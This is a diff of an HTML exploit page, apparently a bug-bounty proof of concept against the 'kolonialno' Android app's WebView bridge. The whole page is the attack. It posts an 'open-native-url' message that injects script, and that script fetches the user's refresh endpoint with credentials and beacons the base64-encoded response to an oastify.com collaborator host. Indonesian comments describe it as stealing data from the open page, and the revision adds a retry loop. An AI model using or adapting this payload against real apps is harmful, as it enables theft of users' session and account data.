@@ -1,16 +1,22 @@
 <!DOCTYPE html>
 <html>
 <script>
-    window.onload = function() {
-        if (window.AndroidMessageHandler) {
-            // Kita picu transisi ke layar native 'cart'
-            // Sambil menyuntikkan script untuk mencuri data dari halaman yang sedang dibuka
-            AndroidMessageHandler.postMessage(JSON.stringify({
-                command: "open-native-url",
-                url: "kolonialno://cart", 
-                callbackString: "fetch('/api/v1/user/refresh', {credentials: 'include'}).then(r=>r.text()).then(d=>{new Image().src='https://eq8zfh1shueiypnxe2o0nsnjpav1ju7j.oastify.com/leak?data='+btoa(d);});"
-            }));
-        }
-    };
+window.onload = function() {
+  function trigger() {
+    if (window.AndroidMessageHandler) {
+      AndroidMessageHandler.postMessage(JSON.stringify({
+        command: "open-native-url",
+        url: "kolonialno://cart",
+        callbackString:
+"setTimeout(function(){fetch('/api/v1/user/refresh',{credentials:'include'})"
++ ".then(r=>r.text())"
++ ".then(d=>{new Image().src='https://li767otz916pqwf469g7fzfqhhn8b2zr.oastify.com/leak?data='+btoa(d);});},1000);"
+      }));
+    } else {
+      setTimeout(trigger, 500); // retry sampai ready
+    }
+  }
+  trigger();
+};
 </script>
 </html>
